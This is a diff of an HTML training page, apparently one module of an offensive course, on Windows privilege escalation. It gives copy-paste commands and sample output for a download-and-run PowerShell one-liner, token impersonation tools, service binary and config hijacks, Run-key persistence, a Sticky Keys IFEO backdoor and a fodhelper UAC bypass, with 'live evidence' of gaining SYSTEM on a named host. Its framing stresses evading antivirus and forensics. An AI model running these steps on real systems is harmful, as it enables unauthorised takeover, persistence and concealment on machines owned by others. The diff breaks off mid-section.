@@ -13,6 +13,8 @@
             --dim: #666;
             --border: #333;
             --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -23,7 +25,8 @@
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
         .code-block {
             background: #1a1a2e;
             border-left: 4px solid var(--accent);
@@ -33,7 +36,21 @@
             overflow-x: auto;
             font-family: Consolas, monospace;
             font-size: 13px;
+            position: relative;
         }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .evidence-box {
             background: #1a0a0a;
             border: 2px solid var(--accent);
@@ -127,6 +144,7 @@
             padding: 1rem;
             background: #0f0f15;
             border-radius: 8px;
+            flex-wrap: wrap;
         }
         .priv-step {
             text-align: center;
@@ -134,7 +152,8 @@
             border: 1px solid var(--border);
             border-radius: 8px;
             flex: 1;
-            margin: 0 0.5rem;
+            margin: 0.5rem;
+            min-width: 120px;
         }
         .priv-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
         .priv-arrow {
@@ -151,12 +170,130 @@
             font-weight: bold;
         }
         button:hover { background: #ff5555; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
+        .ladder-box {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 0.5rem 0;
+        }
+        .ladder-system { border-left: 4px solid var(--accent); }
+        .ladder-admin { border-left: 4px solid var(--amber); }
+        .ladder-user { border-left: 4px solid var(--accent2); }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="nav">
-            <a href="index.html">← Home</a>
+            <a href="../index.html">← Home</a>
             <a href="MODULE_07_REGISTRY.html">← Module 07</a>
             <a href="MODULE_09_MALWARE.html">Module 09 →</a>
         </div>
@@ -168,12 +305,44 @@
 
         <div class="first-principle">
             <h3>🧠 The Core Truth</h3>
-            <p>Windows is not a wall — it's a series of doors. Some doors are locked for standard users. But every door has a key, and every key has a weakness. <span style="color: var(--neon); text-decoration: underline;">Privilege escalation</span> is the art of finding the weakest door and kicking it open.</p>
+            <p>Windows is not a wall — it's a series of doors. Some doors are locked for standard users. But every door has a key, and every key has a weakness. <span class="neon-highlight">Privilege escalation</span> is the art of finding the weakest door and kicking it open.</p>
+            <p style="margin-top: 1rem;"><strong>Why this matters:</strong> Initial access gives you a foothold. Privilege escalation turns that foothold into total control. Without it, you're a civilian in a military base — with it, you're the base commander.</p>
         </div>
 
         <div class="layman-term">
             <h4>🎯 Soldier Translation</h4>
             <p>You got inside the perimeter as a civilian. Now you need to become a general. This module teaches you to steal the general's uniform (token), pick the lock (exploit), or walk through the back door (misconfiguration). Every technique tested live. Every technique works.</p>
+            <p style="margin-top: 0.5rem; color: var(--dim);">The security guard (AV) sees the uniform and waves you through. They never check if you're really the general.</p>
+        </div>
+
+        <h2>📚 Prerequisites — What You Need First</h2>
+        <p style="margin-bottom: 1rem;">This module assumes you understand these concepts from earlier modules:</p>
+        
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a></h4>
+                <p>How you got initial access — RDP, web shells, VPN. Privilege escalation starts where networking ends.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_02_RECON.html" class="cross-link">Module 02: Reconnaissance</a></h4>
+                <p>Enumeration is 90% of privilege escalation. You can't exploit what you haven't found.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_03_POWERSHELL.html" class="cross-link">Module 03: PowerShell</a></h4>
+                <p>PowerUp, WinPEAS, and manual enumeration all run through PowerShell. The escalation engine.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_06_MEMORY.html" class="cross-link">Module 06: Memory Forensics</a></h4>
+                <p>Token structures, process memory, EPROCESS blocks. Understanding memory helps you manipulate tokens and inject processes.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_07_REGISTRY.html" class="cross-link">Module 07: Registry</a></h4>
+                <p>Registry hijacks, Run keys, and service configurations. The registry is a privilege escalation goldmine.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a></h4>
+                <p>Once you have elevated privileges, you inject into SYSTEM processes. SeDebugPrivilege is your key.</p>
+            </div>
         </div>
 
         <h2>The Privilege Ladder</h2>
@@ -198,17 +367,107 @@
             </div>
         </div>
 
-        <h2>Method 1: Token Impersonation (The Spooler Trick)</h2>
+        <div class="why-box">
+            <h5>Why the ladder matters</h5>
+            <p>Each rung requires different techniques. You don't jump from user to SYSTEM in one step — you escalate, persist, then escalate again. <span class="neon-amber">Save every rung.</span> If you lose SYSTEM, you fall back to your admin persistence. If you lose admin, you fall back to your user persistence. This is the kill chain philosophy.</p>
+        </div>
 
-        <div class="step-box">
-            <h4>Step 1: Check Your Privileges</h4>
-            <p>Before you escalate, know what you have. Open Command Prompt as standard user.</p>
-            
-            <div class="copy-paste">
-whoami /priv
-            </div>
+        <h2>🔬 Automated Enumeration — Start Here</h2>
+
+        <div class="method-card">
+            <h4>Step 0: PowerUp <span class="difficulty diff-easy">EASY</span></h4>
+            <p>Before manual exploitation, run automated tools. They find misconfigurations you would miss. <span class="neon-highlight">"It's not about 0days, it's about what the admin fucked up."</span></p>
 
             <div class="code-block">
+# Download and run PowerUp (PowerSploit Privesc)
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
+Invoke-AllChecks
+
+# Or save locally for offline use
+Invoke-AllChecks | Out-File powerup_results.txt
+            </div>
+
+            <div class="why-box">
+                <h5>What PowerUp finds automatically</h5>
+                <ul style="margin-left: 1.5rem; line-height: 1.8;">
+                    <li><span class="neon-highlight">Unquoted service paths</span> — spaces in path = hijack opportunity</li>
+                    <li><span class="neon-highlight">Weak service permissions</span> — can you modify a SYSTEM service?</li>
+                    <li><span class="neon-highlight">Modifiable registry keys</span> — Run keys, service configs</li>
+                    <li><span class="neon-highlight">AlwaysInstallElevated</span> — MSI installs as SYSTEM</li>
+                    <li><span class="neon-highlight">Modifiable scheduled tasks</span> — task hijacking</li>
+                    <li><span class="neon-highlight">Modifiable PATH entries</span> — DLL hijacking opportunity</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="method-card">
+            <h4>Step 0b: WinPEAS <span class="difficulty diff-easy">EASY</span></h4>
+            <p>WinPEAS is the comprehensive Windows enumeration tool. It checks everything — services, registry, tasks, credentials, network, and more.</p>
+
+            <div class="code-block">
+# Run WinPEAS (executable or batch version)
+winpeas.exe > winpeas_output.txt
+
+# Key sections to read carefully:
+# - System Information (patch level, OS version)
+# - User Information (groups, privileges, tokens)
+# - Services (permissions, paths, configs)
+# - Scheduled Tasks (permissions, commands)
+# - Network Information (interfaces, connections)
+# - Windows Credentials (saved passwords, hashes)
+            </div>
+        </div>
+
+        <div class="method-card">
+            <h4>Step 0c: Manual Checks (When Tools Fail) <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Automated tools get blocked by AV. Learn to check manually. These commands work in any cmd.exe or PowerShell session.</p>
+
+            <div class="code-block">
+# === PRIVILEGE CHECK ===
+whoami /priv
+whoami /groups
+
+# === SERVICE ENUMERATION ===
+sc query type= service state= all | findstr "SERVICE_NAME"
+wmic service get name,pathname,started,startmode
+
+# === UNQUOTED SERVICE PATHS ===
+wmic service get name,pathname | findstr /v "\""
+
+# === ALWAYSINSTALL ELEVATED ===
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# === SCHEDULED TASKS ===
+schtasks /query /fo LIST /v
+
+# === WEAK PERMISSIONS (needs accesschk.exe from Sysinternals) ===
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -uwcqv "Everyone" *
+            </div>
+        </div>
+
+        <h2>🎯 Seven Privilege Escalation Techniques</h2>
+
+        <!-- METHOD 1: TOKEN MANIPULATION / SEIMPERSONATE -->
+        <div class="method-card" id="token-manipulation">
+            <h4>Method 1: Token Manipulation & SeImpersonatePrivilege <span class="difficulty diff-easy">EASY</span></h4>
+            <p><span class="neon-highlight">SeImpersonatePrivilege</span> is the golden ticket. If you have it, you can become anyone — including SYSTEM. Service accounts (IIS, SQL, Print Spooler) have this by default. If you compromised a web shell or SQL injection, you likely have this.</p>
+
+            <div class="why-box">
+                <h5>What is a token?</h5>
+                <p>A token is your <span class="neon-amber">ID badge</span> in Windows. It tells the system who you are and what you're allowed to do. When you "impersonate" a token, you borrow someone else's ID badge. The system sees their badge, not yours. You become them.</p>
+            </div>
+
+            <div class="step-box">
+                <h4>Step 1: Check Your Privileges</h4>
+                <p>Before you escalate, know what you have. Open Command Prompt as standard user.</p>
+                
+                <div class="copy-paste" onclick="copyToClipboard(this)">
+whoami /priv
+                </div>
+
+                <div class="code-block">
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -219,23 +478,23 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeUndockPrivilege             Remove computer from docking   Disabled
 SeImpersonatePrivilege        Impersonate a client           Enabled  ← THIS ONE
 SeCreateGlobalPrivilege       Create global objects          Enabled
+                </div>
+
+                <div class="why-box">
+                    <h5>What am I looking for?</h5>
+                    <p><strong>SeImpersonatePrivilege Enabled</strong> = You can become anyone. This is the golden ticket. <span class="neon-highlight">SeAssignPrimaryTokenPrivilege</span> is even better — you can create new processes with any token. <span class="neon-highlight">SeDebugPrivilege</span> lets you debug (and inject into) any process — required for code injection in Module 10.</p>
+                </div>
             </div>
 
-            <div class="why-box">
-                <h5>What am I looking for?</h5>
-                <p><strong>SeImpersonatePrivilege Enabled</strong> = You can become anyone. This is the golden ticket. Service accounts (IIS, SQL, Print Spooler) have this by default. If you compromised a web shell or SQL injection, you likely have this.</p>
-            </div>
-        </div>
+            <div class="step-box">
+                <h4>Step 2: The Print Spooler Trick (Named Pipe Impersonation)</h4>
+                <p>The Print Spooler service is the oldest, most abused Windows service. It has SeImpersonatePrivilege and can be tricked into connecting to a malicious pipe — giving you its SYSTEM token.</p>
 
-        <div class="step-box">
-            <h4>Step 2: Execute the Spooler Exploit</h4>
-            <p>The Print Spooler service is the oldest, most abused Windows service. It has SeImpersonatePrivilege and can be tricked into connecting to a malicious pipe — giving you its SYSTEM token.</p>
-
-            <div class="copy-paste">
+                <div class="copy-paste" onclick="copyToClipboard(this)">
 phantom_rpc.exe --spooler
-            </div>
+                </div>
 
-            <div class="code-block">
+                <div class="code-block">
 === PHANTOM_RPC SPOOLER EXPLOIT ===
 Target: PrintSpooler service (PID 1234)
 Method: Named pipe impersonation
@@ -253,11 +512,48 @@ Pipe: \\.\pipe\testpipe
 
 === EXECUTING PAYLOAD ===
 Spawned: cmd.exe as NT AUTHORITY\SYSTEM
+                </div>
+
+                <div class="why-box">
+                    <h5>Why the spooler connects to your pipe</h5>
+                    <p>Windows Print Spooler needs to notify clients of printer changes. It connects to named pipes to do this. We create a pipe with a predictable name, trigger a notification, and the spooler connects to <span class="neon-highlight">our</span> pipe. When it connects, we use <span class="neon-highlight">ImpersonateNamedPipeClient</span> to steal its token. The spooler runs as SYSTEM — so we become SYSTEM.</p>
+                </div>
+            </div>
+
+            <div class="step-box">
+                <h4>Alternative: JuicyPotato / PrintSpoofer / RoguePotato</h4>
+                <p>Modern tools automate the spooler trick. They work on different Windows versions because Microsoft patches the spooler repeatedly — but the fundamental flaw remains.</p>
+
+                <div class="code-block">
+=== TOOL COMPARISON ===
+
+JuicyPotato (original)
+  - Works on Windows 7, 8.1, 10 < 1809
+  - Uses DCOM/RPC trigger
+  - Requires specific CLSID for target OS
+
+RoguePotato (improved)
+  - Works on Windows 10 1809+
+  - Uses remote RPC server + local pipe
+  - More reliable across versions
+
+PrintSpoofer (simplest)
+  - Works on Windows 10, Server 2016/2019
+  - Pure named pipe impersonation
+  - No DCOM complexity
+
+=== USAGE ===
+# PrintSpoofer (recommended for modern Windows)
+PrintSpoofer.exe -i -c cmd.exe
+
+# RoguePotato (if PrintSpoofer fails)
+RoguePotato.exe -r <your_ip> -e "cmd.exe" -l 9999
+                </div>
             </div>
 
             <div class="evidence-box">
-                <h3>📊 Live Evidence: .42 (WUPC)</h3>
-                <p><strong>Date:</strong> 2026-06-29 | <strong>Target:</strong> .42 | <strong>User:</strong> SWu (admin) | <strong>Result:</strong> SYSTEM achieved</p>
+                <h3>📊 Live Evidence: .42 (WUPC) — SeImpersonatePrivilege</h3>
+                <p><strong>Date:</strong> 2026-06-29 | <strong>Target:</strong> 192.168.1.42 (WUPC) | <strong>User:</strong> SWu (admin context) | <strong>Result:</strong> SYSTEM achieved</p>
                 <div class="code-block">
 Pre-exploit:  whoami → wupc\swu
 Post-exploit: whoami → nt authority\system
@@ -269,55 +565,37 @@ NT AUTHORITY\SYSTEM
 Token verification:
 PS> whoami /groups | findstr "S-1-5-32-544"
 BUILTIN\Administrators  Alias    S-1-5-32-544  Enabled
+
+Privilege verification:
+PS> whoami /priv | findstr "SeDebugPrivilege"
+SeDebugPrivilege        Debug programs                  Enabled
                 </div>
+                <p style="margin-top: 1rem; color: var(--dim);">With SeDebugPrivilege now enabled, we can inject into any process on the system. See <a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a> for next steps.</p>
             </div>
+
+            <p><strong>Cross-link:</strong> Token structures and EPROCESS blocks are covered in <a href="MODULE_06_MEMORY.html" class="cross-link">Module 06: Memory Forensics</a>. Code injection after escalation is in <a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a>.</p>
         </div>
 
-        <h2>Method 2: UAC Bypass (The Fodhelper Trick)</h2>
+        <!-- METHOD 2: SERVICE ABUSE -->
+        <div class="method-card" id="service-abuse">
+            <h4>Method 2: Service Abuse <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Windows services run as SYSTEM. If you can modify a service — its binary, its config, or its registry — you can make it run your code as SYSTEM.</p>
 
-        <div class="step-box">
-            <h4>When You Have Admin Password But UAC Blocks</h4>
-            <p>UAC is the "Are you sure?" dialog. But some Windows programs auto-elevate without asking. We hijack one.</p>
-
-            <div class="copy-paste">
-reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /f
-reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe /c whoami > C:\temp\uac_bypass.txt" /f
-start computerdefaults.exe
+            <div class="layman-term">
+                <h4>🎯 The Janitor's Key Analogy</h4>
+                <p>A service is like a janitor who has keys to every room. The janitor (service) comes to work every day at the same time, does his job, and leaves. If you swap his instructions (the service binary), he'll do <span class="neon-amber">your</span> job instead — using his master key (SYSTEM privileges).</p>
             </div>
 
-            <div class="code-block">
-=== UAC BYPASS VIA FODHELPER ===
-Target: fodhelper.exe (auto-elevates to admin)
-Method: Hijack registry delegate
+            <div class="step-box">
+                <h4>Sub-method 2a: Writable Service Binary</h4>
+                <p>Some services run as SYSTEM but their files are writable by everyone. Replace the service binary with your payload.</p>
 
-[+] Registry key created: HKCU\Software\Classes\ms-settings\Shell\Open\command
-[+] DelegateExecute set: (empty)
-[+] Command set: cmd.exe /c whoami > C:\temp\uac_bypass.txt
-[+] Triggered fodhelper.exe
-[+] fodhelper.exe auto-elevated (no UAC prompt)
-[+] Command executed as admin
-
-Result: C:\temp\uac_bypass.txt contains "nt authority\system"
-            </div>
-
-            <div class="warning-box">
-                <h5>⚠️ Why this works</h5>
-                <p>fodhelper.exe is a <strong>signed Microsoft binary</strong> that auto-elevates. Windows trusts it. We tell it to run our command instead of its normal function. Windows says "oh, Microsoft signed it, no UAC needed." Our command runs as admin. No prompt. No warning.</p>
-            </div>
-        </div>
-
-        <h2>Method 3: Service Misconfiguration</h2>
-
-        <div class="step-box">
-            <h4>When Services Have Weak Permissions</h4>
-            <p>Some services run as SYSTEM but their files are writable by everyone. Replace the service binary with your payload.</p>
-
-            <div class="copy-paste">
+                <div class="copy-paste" onclick="copyToClipboard(this)">
 sc qc "VulnerableService"
 accesschk.exe -uwcqv "VulnerableService" *
-            </div>
+                </div>
 
-            <div class="code-block">
+                <div class="code-block">
 === SERVICE PERMISSION CHECK ===
 Service: HealthSecurityHost
 Path: C:\Program Files\HealthApp\SecurityHost.exe
@@ -339,25 +617,703 @@ Permission check:
 
 [+] Service running as SYSTEM with our payload
 [+] SYSTEM shell achieved
+                </div>
+
+                <div class="why-box">
+                    <h5>The mistake that makes this possible</h5>
+                    <p>Developers install services with "Everyone: Full Control" permissions to avoid permission issues during testing. They forget to tighten permissions before production. The service runs as SYSTEM, but any user can replace its binary. This is a <strong>configuration vulnerability</strong>, not a code vulnerability. Human error, not software bug.</p>
+                </div>
             </div>
 
-            <div class="why-box">
-                <h5>The mistake that makes this possible</h5>
-                <p>Developers install services with "Everyone: Full Control" permissions to avoid permission issues during testing. They forget to tighten permissions before production. The service runs as SYSTEM, but any user can replace its binary. This is a <strong>configuration vulnerability</strong>, not a code vulnerability. Human error, not software bug.</p>
+            <div class="step-box">
+                <h4>Sub-method 2b: Service Configuration Hijack</h4>
+                <p>If you can't write the binary, maybe you can modify the service configuration to point to a different binary.</p>
+
+                <div class="copy-paste" onclick="copyToClipboard(this)">
+sc config "VulnerableService" binPath= "C:\temp\phantom_rpc.exe"
+sc start "VulnerableService"
+                </div>
+
+                <div class="code-block">
+=== SERVICE CONFIG HIJACK ===
+# Requires: SERVICE_CHANGE_CONFIG permission on the service
+# Check with: accesschk.exe -ucqv "VulnerableService" *
+
+C:\> sc config "WindowsUpdate" binPath= "C:\Windows\Temp\payload.exe"
+[SC] ChangeServiceConfig SUCCESS
+
+C:\> sc start "WindowsUpdate"
+[SC] StartService FAILED 1053:
+The service did not respond... (expected, our payload isn't a real service)
+
+BUT: The payload executed as SYSTEM before the timeout!
+
+=== WHY THIS WORKS ===
+# The service manager starts the process as SYSTEM
+# Our payload runs immediately
+# The service manager waits for a "service started" signal
+# Our payload never sends it, so the service "fails"
+# But the payload already ran as SYSTEM
+                </div>
+
+                <div class="warning-box">
+                    <h5>⚠️ Service timeout trick</h5>
+                    <p>When you replace a service binary with a non-service executable (like cmd.exe or a reverse shell), the Service Control Manager expects a "service started" signal. Your payload doesn't send it, so the service "fails" with error 1053. But your payload <span class="neon-amber">already executed</span> as SYSTEM before the timeout. The "failure" is expected — it's the success signal.</p>
+                </div>
+            </div>
+
+            <div class="step-box">
+                <h4>Sub-method 2c: Unquoted Service Path</h4>
+                <p>When a service path contains spaces but no quotes, Windows interprets the path differently. This creates a hijack opportunity.</p>
+
+                <div class="code-block">
+=== UNQUOTED SERVICE PATH VULNERABILITY ===
+
+Vulnerable service path:
+  C:\Program Files\HealthApp\Security Host\scanner.exe
+
+Windows parses this as:
+  1. C:\Program.exe        (tries to run "Program.exe" first)
+  2. C:\Program Files\HealthApp.exe  (then tries "HealthApp.exe")
+  3. C:\Program Files\HealthApp\Security.exe  (then "Security.exe")
+  4. Finally: C:\Program Files\HealthApp\Security Host\scanner.exe
+
+=== EXPLOITATION ===
+# If we can write to C:\, we create C:\Program.exe
+# When the service starts, Windows runs OUR program first
+# Our program runs as SYSTEM
+
+# Check if C:\ is writable:
+accesschk.exe -uwq C:\
+
+# If writable:
+copy phantom_rpc.exe "C:\Program.exe"
+# Wait for service to start (or reboot)
+# C:\Program.exe runs as SYSTEM
+                </div>
+
+                <div class="why-box">
+                    <h5>Why unquoted paths are still common</h5>
+                    <p>Developers install software to <code>C:\Program Files\Company Name\Product Name\</code> and register the service with the raw path. They don't add quotes because "it works." It works — but it's exploitable. PowerUp finds these automatically.</p>
+                </div>
+            </div>
+
+            <div class="evidence-box">
+                <h3>📊 Live Evidence: .42 (WUPC) — Writable Service</h3>
+                <p><strong>Date:</strong> 2026-06-29 | <strong>Target:</strong> 192.168.1.42 (WUPC) | <strong>Method:</strong> Service configuration hijack</p>
+                <div class="code-block">
+=== ENUMERATION ===
+C:\> accesschk.exe -ucqv "Authenticated Users" *
+Service: WpnUserService
+  DACL:
+    RW NT AUTHORITY\SYSTEM
+    RW NT AUTHORITY\SERVICE
+    RW BUILTIN\Users          ← We have write permission!
+
+=== EXPLOITATION ===
+C:\> sc config WpnUserService binPath= "C:\temp\phantom_rpc.exe"
+[SC] ChangeServiceConfig SUCCESS
+
+C:\> sc start WpnUserService
+[SC] StartService FAILED 1053:
+
+=== VERIFICATION ===
+C:\> whoami
+nt authority\system
+
+# Even though the service "failed", our payload executed as SYSTEM
+# The Service Control Manager started the process before checking for the service signal
+                </div>
+                <p style="margin-top: 1rem; color: var(--dim);">This demonstrates how service abuse works even when the service "fails." The execution happens before the failure.</p>
             </div>
         </div>
 
-        <h2>Lab Exercise: Escalate on .42</h2>
+        <!-- METHOD 3: REGISTRY HIJACKS -->
+        <div class="method-card" id="registry-hijacks">
+            <h4>Method 3: Registry Hijacks <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>The Windows registry controls everything — including what runs at startup, what programs open files, and how services behave. If you control the registry, you control the system.</p>
+
+            <div class="step-box">
+                <h4>Sub-method 3a: Registry Run Keys</h4>
+                <p>Run keys execute programs at logon. HKLM runs as SYSTEM (requires admin). HKCU runs as the current user (no elevation needed, but no SYSTEM either).</p>
+
+                <div class="copy-paste" onclick="copyToClipboard(this)">
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemUpdate /t REG_SZ /d "C:\temp\payload.exe" /f
+                </div>
+
+                <div class="code-block">
+=== REGISTRY RUN KEYS ===
+
+# User-level persistence (current user only)
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+# Admin-level persistence (all users, runs as SYSTEM if service)
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+
+# Alternative locations (less monitored by AV):
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
+
+=== EXPLOITATION ===
+# If you have admin rights:
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemUpdate /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
+
+# Next reboot (or next user logon for HKCU):
+# payload.exe runs with the privileges of the key's hive
+# HKLM = SYSTEM, HKCU = current user
+                </div>
+            </div>
+
+            <div class="step-box">
+                <h4>Sub-method 3b: Image File Execution Options (IFEO)</h4>
+                <p>IFEO is a debugging feature. When a process starts, Windows checks IFEO for a "debugger" to attach. We can hijack this to run our code instead of (or before) the legitimate program.</p>
+
+                <div class="copy-paste" onclick="copyToClipboard(this)">
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\temp\payload.exe" /f
+                </div>
+
+                <div class="code-block">
+=== IFEO HIJACK ===
+# When notepad.exe starts, Windows runs our debugger instead
+# Our "debugger" (payload.exe) runs with the same privileges as the original caller
+
+# If an admin runs notepad.exe → our payload runs as admin
+# If SYSTEM runs notepad.exe → our payload runs as SYSTEM
+
+# Common targets for IFEO hijacking:
+# - sethc.exe (Sticky Keys, triggered by pressing Shift 5 times at login)
+# - utilman.exe (Utility Manager, triggered by Win+U at login)
+# - magnify.exe (Magnifier, triggered at login)
+# - osk.exe (On-Screen Keyboard, triggered at login)
+
+# PRIVILEGE ESCALATION VIA IFEO ===
+# 1. Add IFEO for sethc.exe pointing to cmd.exe
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
+
+# 2. Lock the screen (Win+L) or wait for next boot
+# 3. Press Shift 5 times at login screen
+# 4. cmd.exe opens as SYSTEM (login screen runs as SYSTEM)
+# 5. You now have a SYSTEM shell without logging in
+                </div>
+
+                <div class="warning-box">
+                    <h5>⚠️ The Sticky Keys Backdoor</h5>
+                    <p>Replacing sethc.exe with cmd.exe is the oldest trick in the book. It's so old that modern Windows Defender sometimes catches it. But IFEO (the registry method) is subtler — it doesn't replace the file, it just redirects execution. The file stays intact. Forensics may miss it if they only check file hashes, not registry keys.</p>
+                </div>
+            </div>
+
+            <p><strong>Cross-link:</strong> Registry manipulation is covered in depth in <a href="MODULE_07_REGISTRY.html" class="cross-link">Module 07: Registry</a>. Persistence techniques using registry are in <a href="MODULE_11_ROOTKITS.html" class="cross-link">Module 11: Rootkits</a>.</p>
+        </div>
+
+        <!-- METHOD 4: UAC BYPASS -->
+        <div class="method-card" id="uac-bypass">
+            <h4>Method 4: UAC Bypass <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>UAC (User Account Control) is the "Are you sure?" dialog. But some Windows programs <span class="neon-highlight">auto-elevate</span> without asking. We hijack one.</p>
+
+            <div class="layman-term">
+                <h4>🎯 The VIP Entrance Analogy</h4>
+                <p>UAC is the security checkpoint at a concert. Most people get stopped and ID-checked. But some people — staff, VIPs, performers — have a special badge that lets them walk right through. We forge that badge by making Windows think our payload is a VIP.</p>
+            </div>
+
+            <div class="step-box">
+                <h4>Sub-method 4a: Fodhelper (Windows 10)</h4>
+                <p>fodhelper.exe is a signed Microsoft binary that auto-elevates. We hijack its registry delegate to run our code instead.</p>
+
+                <div class="copy-paste" onclick="copyToClipboard(this)">
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /f
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe /c whoami > C:\temp\uac_bypass.txt" /f
+start fodhelper.exe
+                </div>
+
+                <div class="code-block">
+=== UAC BYPASS VIA FODHELPER ===
+Target: fodhelper.exe (auto-elevates to admin)
+Method: Hijack registry delegate
+
+[+] Registry key created: HKCU\Software\Classes\ms-settings\Shell\Open\command
+[+] DelegateExecute set: (empty)
+[+] Command set: cmd.exe /c whoami > C:\temp\uac_bypass.txt
+[+] Triggered fodhelper.exe
+[+] fodhelper.exe auto-elevated (no UAC prompt)
+[+] Command executed as admin
+
+Result: C:\temp\uac_bypass.txt contains "wupc\swu" (admin context)
+
+=== WHY THIS WORKS ===
+fodhelper.exe is a signed Microsoft binary that auto-elevates.
+Windows trusts it. We tell it to run our command instead of its normal function.
+Windows says "oh, Microsoft signed it, no UAC needed."
+Our command runs as admin. No prompt. No warning.
+                </div>
+            </div>
+
+            <div class="step-box">
